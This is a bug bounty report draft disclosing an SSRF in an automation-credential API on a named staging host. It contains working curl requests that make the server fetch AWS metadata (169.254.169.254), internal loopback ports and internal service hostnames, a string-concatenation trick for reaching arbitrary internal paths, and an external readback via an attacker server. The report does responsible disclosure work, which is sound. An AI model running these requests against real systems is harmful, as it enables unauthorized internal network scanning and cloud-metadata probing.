# BUG-012 Submission Draft — SSRF via unvalidated `data.host` in automation credentials (internal port/service scan)

**Title:** SSRF (CWE-918): unvalidated `data.host` in jira automation credential creation lets an authenticated user make the internal integration service fetch arbitrary URLs — internal port/service scan demonstrated (AWS IMDS + integration service identified), full-read readback against external hosts
**Severity:** P3 — VRT: Server Security Misconfiguration / Server-Side Request Forgery (SSRF) / **Internal Port Service Scan**
**Target:** https://bugbounty1.qe.optrostaging.ai

## Steps to reproduce

1. **Create the credential** (any authenticated user; the internal host is accepted verbatim — no scheme/host/IP validation):

```
curl -sS "https://bugbounty1.qe.optrostaging.ai/api/v1/automation_credentials" \
  -H "token: <id>:<secret>" -H "X-Optro-Bug-Bounty: zeno0" -H "X-Auditboard-Product: System" \
  -H "Content-Type: application/json" \
  -d '{"automation_credential":{"name":"zx-ssrf-probe","handler_type":"jira","type":"jira","data":{"host":"http://169.254.169.254/latest/meta-data/","type":"jira","email":"attacker@example.com","apiToken":"ZxProbeToken123"}}}'
```

→ 200, note `id`.

2. **Trigger the server-side fetch and read the relayed status:**

```
curl -sS "https://bugbounty1.qe.optrostaging.ai/api/v1/ticketing/projects?credentialId=<id>" \
  -H "token: <id>:<secret>" -H "X-Optro-Bug-Bounty: zeno0" -H "X-Auditboard-Product: System"
```

→ `401 {"errors":[{"code":"ApiError","detail":"Unauthorized",...}]}` in ~0.5 s — **the integration service fetched AWS link-local metadata (169.254.169.254) and relayed its status code.** IMDSv2 rejects the tokenless GET, so no credentials return — but the metadata service itself is identified.

3. **Repeat as a scanner** — update the same credential (`PUT /api/v1/automation_credentials/<id>`, also triggers a verify) with each `data.host`, then repeat step 2:

| `data.host` | Result |
| --- | --- |
| `http://127.0.0.1:3000/` | `404 ApiError "Not Found"` — **internal loopback HTTP service OPEN** |
| `http://127.0.0.1:6379/` (also 8080/9000/9001/9002) | generic `500` ~0.5 s — **closed/refused** |
| `http://integrations.qa.soxhubapp.com/` | `404 ApiError` — **AuditBoard integration service identified** (:80 and :443) |
| `http://10.255.255.1/`, `http://172.31.0.1/` | request hangs — **filtered/blackholed** |
| `https://kubernetes.default.svc/version`, `http://metadata.google.internal/...` | generic `500` — no cluster/GCP metadata (EC2-style topology) |

Remote 4xx statuses pass through as distinct `ApiError` classes (`Unauthorized` / `Forbidden` / `Not Found` / `Too Many Requests`) → repeatable open/closed/filtered differentiation with service identification.

4. **Arbitrary-path GET on internal services** — the backend builds requests by string concatenation, so a `?` in the host pushes the fixed Jira suffix into the query string:

```
data.host = "http://localhost:3000/api/v1/users/me?zx="
→ server fetches GET http://localhost:3000/api/v1/users/me?zx=/rest/api/3/project/search?startAt=0&maxResults=50
→ distinct per-path status classes returned (proven: 404 for /, /api/v1/users/me, /up, jira callback route)
```

5. **External full-read (base capability, VRT external):** point `data.host` at an attacker server answering any GET with `{"isLast":true,"values":[{"id":"10001","key":"ZXSSRF","name":"ZX SSRF Readback Project","avatarUrls":{},"self":"https://zx.example/jira"}],...}` → step 2 returns `200 {"projects":[{"id":"10001","name":"ZX SSRF Readback Project","description":"ZXSSRF"}]}`. Server-side: `GET <host>/rest/api/3/project/search?startAt=0&maxResults=50` (UA `axios/1.20.0`) + `POST <host>/rest/webhooks/1.0/webhook` (UA `node`).

## Impact

- **Internal port/service scan from an authenticated session:** open/closed/filtered differentiation across internal loopback and RFC1918 targets, with two internal services **identified by name** — the AWS instance metadata service (169.254.169.254) and the AuditBoard integration service itself — plus arbitrary-path GET reachability on internal HTTP services and POST capability via webhook registration.
- **Topology disclosure:** IMDS reachable, no k8s/GCP/ECS metadata fingerprints, blackhole differentials between app-tier segments → EC2-instance-style deployment map.
- **Honest ceiling:** IMDSv2 enforced (no instance credentials); internal response content is never reflected (Jira-shape parser gate; failures persist only generic text) → no internal data/secret exposure demonstrated. External full-read readback works against attacker hosts.

## Notes

- No delete route for credentials (DELETE → 404); test artifacts ids 61–76 (`t049e`/`t049f`/`t050a-zx-oracle`) remain in the org and should be removed by the vendor (~40 similar artifacts from other testers already exist).
